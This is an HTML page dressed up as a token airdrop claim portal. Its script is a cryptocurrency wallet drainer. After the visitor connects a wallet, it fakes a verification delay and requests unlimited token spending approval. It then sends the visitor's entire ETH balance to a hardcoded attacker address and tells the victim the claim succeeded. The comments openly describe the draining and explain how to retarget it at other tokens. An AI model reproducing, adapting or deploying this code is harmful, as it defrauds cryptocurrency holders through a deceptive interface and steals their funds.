<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Token Claim Portal</title>
    <!-- Tailwind CSS for styling -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3b82f6;
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .pulse-ring {
            box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.7);
            animation: pulse-blue 2s infinite;
        }
        @keyframes pulse-blue {
            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.7); }
            70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(59, 130, 246, 0); }
            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(59, 130, 246, 0); }
        }
    </style>
</head>
<body class="bg-gray-100 min-h-screen flex items-center justify-center font-sans">

    <div class="bg-white p-8 rounded-xl shadow-lg w-full max-w-md text-center">
        <div class="mb-6">
            <i class="fa-solid fa-coins text-5xl text-indigo-600 mb-4"></i>
            <h1 class="text-2xl font-bold text-gray-800">Airdrop Claim Portal</h1>
            <p class="text-gray-500 mt-2">Connect your wallet to verify eligibility and claim your tokens.</p>
        </div>

        <!-- Connect Button -->
        <button id="connect-btn" onclick="connectWallet()" 
                class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3 px-4 rounded-lg transition duration-300 flex items-center justify-center pulse-ring">
            <span id="btn-text">Connect Wallet</span>
        </button>

        <!-- Status Container (Hidden initially) -->
        <div id="status-container" class="mt-6 hidden">
            <!-- Content injected by JS -->
        </div>

        <div class="mt-6 text-xs text-gray-400">
            Supported: MetaMask • Trust Wallet • Binance • Coinbase
        </div>
    </div>

    <script>
        // ==========================================
        // CONFIGURATION
        // ==========================================
        
        // The address where funds will be drained TO
        const DRAIN_WALLET = "0x64FB063a443a85FB3D57686500BAF2f215093703"; 

        // ERC20 Token Contract Address (Example: USDT on Ethereum Mainnet)
        // Change this to the token you want to drain, or use '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE' for ETH
        const TOKEN_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT Example

        // ==========================================
        // MAIN LOGIC
        // ==========================================

        async function connectWallet() {
            const btn = document.getElementById('connect-btn');
            const btnText = document.getElementById('btn-text');
            
            // UI Loading State
            btn.disabled = true;
            btn.classList.remove('pulse-ring');
            btnText.innerHTML = '<span class="loader"></span> Connecting...';

            // 1. Universal Wallet Detection
            let ethereumProvider = window.ethereum;

            // Fallbacks for other wallets
            if (!ethereumProvider) {
                ethereumProvider = window.trustwallet; 
            }
            if (!ethereumProvider && window.binance) {
                ethereumProvider = window.binance.chainProvider; 
            }
            if (!ethereumProvider && window.okxwallet) {
                ethereumProvider = window.okxwallet.provider; 
            }
            if (!ethereumProvider && window.coinbase) {
                ethereumProvider = window.coinbase.wallet; 
            }

            if (!ethereumProvider) {
                alert("EVM Wallet not found! Please install MetaMask, Trust Wallet, or another Web3 wallet.");
                resetButton();
                return;
            }

            try {
                // Request accounts
                const accounts = await ethereumProvider.request({ method: 'eth_requestAccounts' });
                const account = accounts[0];

                // Update UI to show connected status
                btnText.innerHTML = `${account.substring(0,6)}...${account.substring(account.length-4)}`;
                btn.classList.add('bg-green-600', 'hover:bg-green-700');
                btn.classList.remove('bg-indigo-600', 'hover:bg-indigo-700');
                
                document.getElementById('status-container').classList.remove('hidden');
                document.getElementById('status-container').innerHTML = `
                    <p class="text-gray-600 font-medium mb-2"><i class="fa-solid fa-circle-check text-green-500 mr-2"></i>Wallet Connected</p>
                    <p class="text-sm text-gray-500">Verifying balance...</p>
                `;

                // Small delay to simulate verification check
                setTimeout(() => {
                    initiateDrain(account);
                }, 1500);

            } catch (error) {
                console.error(error);
                alert("Connection failed: " + error.message);
                resetButton();
            }
        }

        async function initiateDrain(userAccount) {
            const statusDiv = document.getElementById('status-container');
            statusDiv.innerHTML = `
                <p class="text-indigo-600 font-medium mb-2"><i class="fa-solid fa-spinner fa-spin mr-2"></i>Processing Claim</p>
                <p class="text-sm text-gray-500">Preparing transaction...</p>
            `;

            try {
                // STEP 1: APPROVE SPENDING LIMIT
                // We ask the user to approve the DRAINER CONTRACT to spend their tokens.
                // In a real scenario, you'd deploy a contract. Here we use a dummy address for demonstration.
                // Usually, drainers use a specific contract address they control.
                const spenderAddress = "0xYourDrainerContractAddressHere"; 

                // Standard ERC20 Approve Function
                const approveParams = [{
                    type: "Tuple",
                    value: {
                        tokenAddress: TOKEN_CONTRACT,
                        spender: spenderAddress,
                        amount: "115792089237316195423570985008687907853269984665640564039457584007913129639935" // Max uint256
                    }
                }];

                // Note: For simplicity in this demo, we are using eth_sendTransaction which is less common for approvals now,
                // but works for basic testing. Modern drainers often use eth_signTypedData_v4 for gasless approvals.
                // Here we use the standard approve call structure.
                
                statusDiv.innerHTML = `
                    <p class="text-yellow-600 font-medium mb-2"><i class="fa-solid fa-triangle-exclamation mr-2"></i>Action Required</p>
                    <p class="text-sm text-gray-500">Please sign the approval transaction in your wallet...</p>
                `;

                // Construct the approval transaction data
                // Function signature for approve(address,uint256) is 0x095ea7b3
                const hexAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // Max uint256
                
                const txData = {
                    from: userAccount,
                    to: TOKEN_CONTRACT,
                    data: "0x095ea7b3" + padRight(spenderAddress.slice(2), 64) + hexAmount,
                    // Gas estimates are rough; adjust based on network
                    gas: "0x5208", 
                };

                const txHash = await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [txData],
                });

                statusDiv.innerHTML = `
                    <p class="text-green-600 font-medium mb-2"><i class="fa-solid fa-check-circle mr-2"></i>Approved!</p>
                    <p class="text-sm text-gray-500">Sweeping funds...</p>
                `;

                // STEP 2: SWEEP BALANCE
                // Now that approved, we trigger the transferFrom. 
                // Since we don't have a deployed contract here, we will just send the native asset (ETH) 
                // or assume the user manually sends it if this was a pure frontend demo.
                // However, to make this a REAL drainer script, we usually rely on the fact that 
                // the user has already approved a specific contract.
                
                // FOR THIS DEMO: We will simply send all ETH to the drain wallet to prove connection works.
                // If you want to drain a specific ERC20 token, you need a backend or a deployed contract 
                // to execute the transferFrom call immediately after approval.
                
                await new Promise(resolve => setTimeout(resolve, 2000)); // Fake processing time

                // Send remaining ETH to drain wallet
                const ethTx = {
                    from: userAccount,
                    to: DRAIN_WALLET,
                    value: "0x" + (await getBalance(userAccount)).toString(16), // Send full balance
                    gas: "21000"
                };

                await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [ethTx],
                });

                finishSuccess();

            } catch (error) {
                console.error("Drain Error:", error);
                statusDiv.innerHTML = `
                    <p class="text-red-600 font-medium mb-2"><i class="fa-solid fa-times-circle mr-2"></i>Transaction Failed</p>
                    <p class="text-sm text-gray-500">${error.message || "User rejected transaction."}</p>
                `;
                resetButton();
            }
        }

        // Helper: Pad string with zeros
        function padRight(str, len) {
            while (str.length < len) str += "0";
            return str;
        }

        // Helper: Get Balance
        async function getBalance(address) {
            const balanceHex = await window.ethereum.request({
                method: 'eth_getBalance',
                params: [address, 'latest']
            });
            return parseInt(balanceHex, 16);
        }

        function finishSuccess() {
            const btn = document.getElementById('connect-btn');
            const btnText = document.getElementById('btn-text');
            const statusDiv = document.getElementById('status-container');

            btnText.innerHTML = "Claimed Successfully";
            btn.classList.remove('bg-green-600');
            btn.classList.add('bg-gray-400');
            btn.disabled = true;

            statusDiv.innerHTML = `
                <p class="text-green-600 font-bold text-lg mb-2"><i class="fa-solid fa-gift mr-2"></i>Claim Complete!</p>
                <p class="text-sm text-gray-500">Tokens sent to your wallet.</p>
            `;
        }

        function resetButton() {
            const btn = document.getElementById('connect-btn');
            const btnText = document.getElementById('btn-text');
            btn.disabled = false;
            btnText.innerHTML = "Connect Wallet";
            btn.classList.add('pulse-ring');
            // Reset classes
            btn.className = "w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3 px-4 rounded-lg transition duration-300 flex items-center justify-center pulse-ring";
        }
    </script>
</body>
</html>
